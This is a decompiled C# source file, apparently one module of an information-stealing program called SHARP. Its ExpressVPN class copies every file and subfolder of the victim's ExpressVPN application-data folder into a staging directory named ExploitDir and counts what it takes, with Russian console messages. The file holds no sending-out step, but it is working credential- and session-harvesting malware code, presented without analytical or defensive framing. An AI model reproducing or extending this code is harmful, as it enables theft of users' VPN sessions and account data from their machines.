﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x0200006A RID: 106
	internal class ExpressVPN
	{
		// Token: 0x06000246 RID: 582 RVA: 0x0000E730 File Offset: 0x0000C930
		public static void SaveFileSession()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ExpressVPN";
			string text = Help.ExploitDir + "\\VPN\\ExpressVPN";
			if (!Directory.Exists(path))
			{
				Console.WriteLine("Исходная директория не существует.");
				return;
			}
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			foreach (string text2 in Directory.GetFiles(path))
			{
				string fileName = Path.GetFileName(text2);
				string destFileName = Path.Combine(text, fileName);
				File.Copy(text2, destFileName, true);
				Console.WriteLine("Файл " + fileName + " скопирован успешно.");
				Counting.express++;
			}
			foreach (string text3 in Directory.GetDirectories(path))
			{
				string fileName2 = Path.GetFileName(text3);
				string text4 = Path.Combine(text, fileName2);
				Directory.CreateDirectory(text4);
				ExpressVPN.CopyDirectory(text3, text4);
				Counting.express++;
			}
			Console.WriteLine("Копирование завершено.");
		}

		// Token: 0x06000247 RID: 583 RVA: 0x0000E824 File Offset: 0x0000CA24
		private static void CopyDirectory(string sourceDirectory, string targetDirectory)
		{
			foreach (string text in Directory.GetFiles(sourceDirectory))
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(targetDirectory, fileName);
				File.Copy(text, destFileName, true);
				Console.WriteLine("Файл " + fileName + " скопирован успешно.");
			}
			foreach (string text2 in Directory.GetDirectories(sourceDirectory))
			{
				string fileName2 = Path.GetFileName(text2);
				string text3 = Path.Combine(targetDirectory, fileName2);
				Directory.CreateDirectory(text3);
				ExpressVPN.CopyDirectory(text2, text3);
			}
		}
	}
}
